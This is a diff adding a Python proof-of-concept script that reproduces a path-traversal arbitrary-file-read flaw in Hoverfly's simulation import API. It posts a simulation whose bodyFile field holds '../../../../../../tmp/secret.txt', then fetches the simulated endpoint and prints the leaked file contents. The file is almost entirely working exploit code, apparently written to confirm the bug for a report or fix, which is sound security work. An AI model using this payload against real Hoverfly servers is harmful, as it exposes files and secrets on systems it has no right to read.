+import requests
+import json
+
+HOVERFLY_URL = "http://localhost:8888"
+SIMULATION_ENDPOINT = "/api/v2/simulation"
+
+def create_simulation_with_body_file(body_file_path):
+    simulation_data = {
+        "data": {
+            "pairs": [
+                {
+                    "request": {
+                        "method": [
+                            {
+                                "matcher": "exact",
+                                "value": "GET"
+                            }
+                        ],
+                        "path": [
+                            {
+                                "matcher": "exact",
+                                "value": "/api/test"
+                            }
+                        ]
+                    },
+                    "response": {
+                        "status": 200,
+                        "bodyFile": body_file_path,
+                        "headers": {
+                            "Content-Type": ["text/plain"]
+                        }
+                    }
+                }
+            ],
+            "globalActions": {
+                "delays": []
+            }
+        },
+        "meta": {
+            "schemaVersion": "v5.3",
+            "hoverflyVersion": "v1.10.2",
+            "timeExported": "2024-01-01T12:00:00Z"
+        }
+    }
+    return json.dumps(simulation_data)
+
+def import_simulation(simulation_data):
+    headers = {
+        "Content-Type": "application/json"
+    }
+    response = requests.post(
+        HOVERFLY_URL + SIMULATION_ENDPOINT,
+        data=simulation_data,
+        headers=headers
+    )
+    return response
+
+def test_vulnerability():
+    # Attempt to read /tmp/secret.txt using path traversal
+    malicious_body_file = "../../../../../../tmp/secret.txt"
+    
+    simulation_data = create_simulation_with_body_file(malicious_body_file)
+    
+    response = import_simulation(simulation_data)
+    
+    if response.status_code == 200:
+        print("Vulnerability reproduced: Simulation imported successfully")
+        
+        # Make a request to the simulated endpoint to see if the file was read
+        test_response = requests.get(HOVERFLY_URL + "/api/test")
+        
+        if test_response.status_code == 200 and "secret content" in test_response.text:
+            print("Vulnerability Confirmed: Arbitrary file read successfully")
+            print(f"File content: {test_response.text}")
+        else:
+            print("Failed to confirm vulnerability")
+    else:
+        print(f"Failed to import simulation: {response.text}")
+
+if __name__ == "__main__":
+    test_vulnerability()

